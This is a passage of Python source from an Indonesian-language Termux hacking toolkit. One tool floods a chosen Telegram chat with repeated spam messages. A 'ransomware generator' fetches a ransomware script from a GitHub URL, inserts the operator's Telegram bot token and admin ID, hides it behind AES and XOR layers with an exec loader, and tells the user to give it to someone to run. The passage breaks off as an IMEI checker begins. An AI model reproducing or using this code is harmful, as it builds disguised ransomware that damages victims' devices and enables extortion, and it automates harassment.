⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣠⣶⣿⣶⣄⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⠿⠿⠿⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_tele}" | lolcat 2>/dev/null || echo "{ascii_tele}"')

    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Spam bot Telegram{R} │ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")

    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {W}Masukkan {G}Token Bot")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    bot_token = input(f"{U}❯❯❯ {W}Masukkan Token Bot {G}❯ {N}").strip()
    if not bot_token:
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {R}Token Bot tidak boleh kosong!{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
        return

    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {W}Masukkan {G}ID Chat{W} (User/Group/Channel)")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    chat_id = input(f"{U}❯❯❯ {W}Masukkan ID Chat {G}❯ {N}").strip()
    if not chat_id:
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {R}ID Chat tidak boleh kosong!{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
        return

    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {W}Masukkan {G}Pesan{W} yang mau dikirim")
    print(f"{W}│ {W}Pesan akan dikirim berulang-ulang")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    pesan = input(f"{U}❯❯❯ {W}Masukkan Pesan {G}❯ {N}").strip()
    if not pesan:
        pesan = "Asu lu rekkk"
        print(f"{W}[ {R}??{W} ] Pesan kosong, pakai default{N}")

    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {W}Masukkan {G}Jumlah Spam{W} (max 1000 per sesi)")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    try:
        jumlah = int(input(f"{U}❯❯❯ {W}Masukkan Jumlah {G}❯ {N}").strip())
        if jumlah < 1:
            jumlah = 10
            print(f"{U}❯❯❯ {W}Minimal 1, pakai 10{N}")
        elif jumlah > 1000:
            jumlah = 1000
            print(f"{W}[ {R}??{W} ] Maksimal 1000{N}")
    except:
        jumlah = 10
        print(f"{W}[ {R}??{W} ] Input tidak valid, pakai 10{N}")

    print(f"{W}[ {G}✦{W} ] Mengecek Bot...{N}")
    try:
        cek_url = f"https://api.telegram.org/bot{bot_token}/getMe"
        cek_resp = requests.get(cek_url, timeout=10)
        if cek_resp.status_code != 200:
            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}Token Bot tidak valid!{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
            input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
            return
        bot_data = cek_resp.json()
        if not bot_data.get('ok'):
            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}Token Bot tidak valid!{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
            input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
            return
        bot_name = bot_data.get('result', {}).get('first_name', 'Unknown')
        print(f"{W}[ {R}!{W} ] Bot ditemukan: {bot_name}{N}")
    except:
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {R}Gagal koneksi ke Telegram API!{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
        return

    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r {W}[ {G}✦{W} ] Mengirim Spam ke Telegram [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()

    def kirim_pesan(bot_token, chat_id, pesan):
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {'chat_id': chat_id, 'text': pesan, 'parse_mode': 'HTML'}
            resp = requests.post(url, data=payload, timeout=10)
            return resp.status_code == 200
        except:
            return False

    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {W}Target   {R}: {G}{chat_id}{N}")
    print(f"{W}│ {W}Bot      {R}: {G}{bot_name}{N}")
    print(f"{W}│ {W}Jumlah   {R}: {G}{jumlah}{N}")
    print(f"{W}│ {W}Pesan    {R}: {G}{pesan[:50]}{'...' if len(pesan) > 50 else ''}{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

    confirm = input(f"\n{W}Mulai spam? ({G}y{U}/{R}n{W}): {N}").strip().lower()
    if confirm != 'y':
        print(f"{W}[ {R}!!{W} ] Dibatalkan{N}")
        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
        return

    threads = 10
    success = 0
    failed = 0
    lock = threading.Lock()

    print()

    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()

    def worker(task_num):
        nonlocal success, failed
        status = kirim_pesan(bot_token, chat_id, pesan)
        with lock:
            if status:
                success += 1
            else:
                failed += 1

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, i) for i in range(1, jumlah + 1)]
        for future in as_completed(futures):
            future.result()

    stop_loading.set()
    loading_thread.join()

    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {G}Spam Telegram Selesai!{N}")
    print(f"{W}├─────────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {W}Target   {R}: {G}{chat_id}{N}")
    print(f"{W}│ {W}Berhasil {R}: {G}{success}{N}")
    print(f"{W}│ {W}Gagal    {R}: {R}{failed}{N}")
    print(f"{W}│ {W}Total    {R}: {G}{success + failed}{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_ransomware_generator():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, random, string, base64, hashlib, subprocess
    from datetime import datetime
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        from Crypto.Random import get_random_bytes
    except ImportError:
        print(f"{R}[!] Install pycryptodome dulu: pip install pycryptodome{N}")
        time.sleep(2)
        return

    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    a = '\033[1;30m'

    ascii_ransom = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⡀⡀⡀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠞⠁⠀⠀⠀⠀⠀⠀⢀⠠⠀⠂⠌⠌⠐⢈⠀⢐⠀⠐⡁⠈⠈⡂⡁⠄⠄⡀⠀⠀⠀⠀⠀⠀⠈⠳⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠄⣴⣿⡿⠃⠀⠀⠀⠀⠀⡀⠐⠈⠀⠀⡠⠁⠀⠀⠠⠂⠀⢀⠂⠀⠐⡀⠀⠀⠐⢀⠀⠀⠁⠂⡀⠀⠀⠀⠀⠀⠘⢿⣿⣦⠠⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⠃⣼⣿⠟⡰⠀⠀⠀⠀⡀⠂⠈⠐⠠⠠⢈⠀⠀⠀⠀⠅⠀⠀⢀⠂⠀⠀⢐⠀⠀⠀⠀⠨⠀⠄⠂⠈⠐⠠⠀⠀⠀⠀⢎⠻⢿⣧⠘⣿⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⢐⣿⡗⠰⢋⣡⣾⠁⠀⠀⡀⠂⠀⠀⠀⠀⠠⠁⠀⠂⠂⠂⠌⠄⢄⣴⢒⠶⣶⣤⠐⡐⠠⠁⠁⠁⠁⢂⠀⠀⠀⠀⠁⢂⠀⠀⠘⣷⣌⡙⠆⣹⣿⡄⢄⠀⠀⠀⠀
⠀⠀⣰⡇⢸⣿⢃⣴⣿⠟⠁⠀⢀⠂⠀⠀⠀⠀⠀⠠⠁⠀⠀⠀⠀⠀⠌⠀⠘⠿⠁⡂⣿⣿⠂⠐⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠀⠂⠄⠀⠈⠻⣿⣦⣘⣿⡇⢸⣆⠀⠀⠀
⠀⢠⣿⡇⢸⣯⡿⠛⣡⠀⠀⢀⢂⠀⠀⠀⠀⠀⠀⠅⠀⠀⠀⠀⠀⠠⠁⠀⠀⠀⢀⡾⠋⠁⠀⠈⠄⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠀⠡⢀⠀⠐⣌⠙⢿⣾⡃⣸⣿⠄⠀⠀
⠀⢸⣿⡯⢘⢋⣤⣿⠇⠀⢀⠂⠀⠈⠐⠐⠠⠠⠨⢀⠀⠀⠀⠀⠀⠨⠀⠀⠀⠀⢀⠃⠀⠀⠀⠀⠅⠀⠀⠀⠀⢀⢀⠂⠄⢐⠠⠁⠁⠁⠐⡀⠀⠹⣷⣆⡹⠅⢾⣿⠇⠀⠀
⢠⠨⣿⣟⢠⣾⣿⠋⠀⠀⡐⠀⠀⠀⠀⠀⠀⠠⠁⠀⠈⠈⠈⠈⠐⢁⠂⠂⠐⠠⣿⡿⠠⠀⠂⠄⠅⠂⠈⠐⠁⠀⠀⠨⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠙⣿⣷⡄⣿⣿⠃⡄⠀
⣾⠀⢻⣗⣿⡟⢁⡆⠀⠀⡂⠀⠀⠀⠀⠀⠀⠠⠁⠀⠀⠀⠀⠀⠀⡂⠀⠀⠀⠀⡀⡂⠀⠀⠀⠀⠨⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠀⠀⠀⠈⠄⠀⢰⡈⠿⣿⢼⡟⢀⡷⠀
⣿⡇⠈⣿⠏⢀⣾⠂⠀⠐⠀⠀⠀⠀⠀⠀⠀⠨⠀⠀⠀⠀⠀⠀⠀⢂⠀⡠⠢⣼⣶⣮⣦⠆⢄⠀⠨⠀⠀⠀⠀⠀⠀⠀⠅⠀⠀⠀⠀⠀⠀⠀⠅⠀⠈⣷⡀⢹⡿⠁⣰⣿⠀
⢺⣿⣆⠘⢠⣿⡟⠀⠀⠨⠀⠂⠄⠂⠐⢀⠢⠨⠀⠂⠔⠀⠢⢐⣐⣴⣿⡇⠀⠀⣾⣧⠀⠀⢸⣿⣮⣠⠠⠐⠠⠐⠀⠂⠅⠐⠠⠐⠠⠐⠠⠐⡐⠀⠀⢿⣿⡄⠋⣰⣿⡗⠀
⠘⣿⣿⡂⣿⣿⠃⡀⠀⠨⠀⠀⠀⠀⠀⠀⠀⢐⢠⣶⣶⣿⣿⣿⣿⣿⣿⠀⠀⠈⣸⡇⠁⠀⢈⣿⣿⣿⣿⣿⣷⣾⣶⡄⠡⠀⠀⠀⠀⠀⠀⠀⠄⠀⢀⠘⣿⣿⢠⣿⣿⠃⠀
⣅⠘⢿⣧⣿⡏⢐⡧⠀⠀⠅⠀⠀⠀⠀⠀⠀⢀⣺⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⣾⣿⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡧⠂⠀⠀⠀⠀⠀⠀⠠⠁⠀⣼⡂⢹⣿⢼⡿⠃⣰⠀
⢻⣧⠈⠻⣾⠁⣸⣿⠀⠀⠡⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠈⣿⣿⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠌⠀⠀⣿⡇⢈⣿⠟⢁⣴⡟⠀
⠈⢿⣿⣆⡘⠅⣻⣿⡂⠀⠈⠄⠀⡀⠠⢀⠂⢪⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢈⣿⣿⠄⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⠂⠄⠄⡀⢀⠠⠁⢀⠨⣿⣿⠀⢃⣴⣿⡟⠁⠀
⠀⠈⠻⣿⣷⣄⢻⣿⡂⢹⣄⠈⡐⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⡐⠀⣠⡇⢨⣿⡗⣠⣿⣿⠟⠀⠀⠀
⠀⠀⢢⠘⠻⢿⣯⢿⡇⠨⣿⣄⠀⢂⠀⠀⠀⢽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⡐⠀⣨⣿⠅⣸⡿⣽⡿⠟⢁⡔⠀⠀⠀
⠀⠀⠀⢿⣦⣀⠙⠻⢿⡀⣿⣿⡆⠀⠂⠄⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠌⠀⢰⣿⣿⠠⡿⠟⠉⣀⣴⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣷⣶⣤⣁⠘⣿⣷⡘⢦⣈⢐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⢡⡴⢃⣿⡿⠃⣈⣤⣶⣿⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣷⣮⡿⣧⡘⢿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⠃⣼⣿⣵⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⢤⣈⠉⠋⠛⠻⠳⠌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠡⠞⠟⠋⠋⠉⣁⣤⠊⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣷⣷⣷⣾⣶⣮⣯⣿⡿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣽⣶⣶⣷⣾⣾⣾⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡉⠙⠙⠙⠉⠉⣀⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠉⠉⠙⠙⢉⢉⡡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⡿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⡿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠅⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⠉⠙⠙⠛⠛⠛⠛⠙⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_ransom}" | lolcat 2>/dev/null || echo "{ascii_ransom}"')

    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ Tools {R}: {G}Ransom Generator{R} │ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")

    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {W}Masukkan Password Ransomware Generator Unlocked")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    password = input(f"{U}❯❯❯ {W}Masukkan Password {G}❯ {N}").strip()
    if not password:
        print(f"{W}[ {R}✗{W} ] Password Tidak boleh kosong{N}")
        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
        return

    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ Masukkan Token Bot Telegram")
    print(f"{W}│ Contoh{R}:{a} 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    bot_token = input(f"{U}❯❯❯ {W}Masukkan Token Bot {G}❯ {N}").strip()
    if not bot_token:
        print(f"{W}[ {R}✗{W} ] Token Bot WAJIB diisi!{N}")
        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
        return

    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ Masukkan ID Admin Telegram")
    print(f"{W}│ Contoh{R}:{a} 123456789")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    admin_id = input(f"{U}❯❯❯ {W}Masukkan ID Admin {G}❯ {N}").strip()
    if not admin_id:
        print(f"{W}[ {R}✗{W} ] ID Admin WAJIB diisi!{N}")
        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
        return

    raw_url = "https://raw.githubusercontent.com/OoTotapxciwiiekfkdoapz1910la9911729Kh1/ransomware/refs/heads/main/ransomware.py"
    
    try:
        resp = requests.get(raw_url, timeout=10)
        if resp.status_code != 200:
            return
        real_script = resp.text
    except Exception as e:
        return
        
    real_script = real_script.replace("{{BOT_TOKEN}}", bot_token)
    real_script = real_script.replace("{{ADMIN_ID}}", admin_id)
    real_script = real_script.replace("{{LOCK_CODE}}", password)

    aes_key = get_random_bytes(32)
    iv = get_random_bytes(16)
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    padded = pad(real_script.encode(), AES.block_size)
    encrypted = cipher.encrypt(padded)
    encrypted_b64 = base64.b64encode(encrypted).decode()
    
    xor_key = get_random_bytes(32)
    raw_encoded = encrypted_b64.encode()
    xored = bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(raw_encoded)])
    xored_b64 = base64.b64encode(xored).decode()
    
    obfuscated = f'''import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
_a=base64.b64decode("{xored_b64}")
_b=bytes.fromhex("{xor_key.hex()}")
_c=bytes([_a[i]^_b[i%len(_b)] for i in range(len(_a))])
_d=base64.b64decode(_c.decode())
_e=bytes.fromhex("{aes_key.hex()}")
_f=bytes.fromhex("{iv.hex()}")
exec(compile(unpad(AES.new(_e,AES.MODE_CBC,_f).decrypt(_d),16).decode(),"<string>","exec"))
'''
    
    output_dir = "/sdcard/Ransomware"
    try:
        os.makedirs(output_dir, exist_ok=True)
    except:
        output_dir = os.path.join(os.path.expanduser("~"), "storage", "Ransomware")
        os.makedirs(output_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ransomware_{timestamp}.py"
    filepath = os.path.join(output_dir, filename)
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(obfuscated)
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {G}✓{W} Ransomware Berhasil Di-Generate!{N}")
    print(f"{W}├─────────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {W}File        {R}: {G}{filename}{N}")
    print(f"{W}│ {W}Lokasi      {R}: {G}{output_dir}{N}")
    print(f"{W}│ {W}Password    {R}: {G}{password}{N}")
    print(f"{W}│ {W}Bot Token   {R}: {G}{bot_token}{N}")
    print(f"{W}│ {W}Admin ID    {R}: {G}{admin_id}{N}")
    print(f"{W}├─────────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {R}Peringatan!{W}, Mohon {G}Copy{W} Password dan Jangan Pernah")
    print(f"{W}│ Melupakan Pw {G}Ataupun{W} Menjalankan Ransomware Akibat Termux")
    print(f"{W}│ akan mengalami kerusakan dan bisa sampai ke device Hp Mohon")
    print(f"{W}│ Cukup Kasih orang dan suruh run di Termux nya😹")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_imei_checker():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    
    ascii_imei = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣶⣾⣿⣿⣿⣿⣷⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
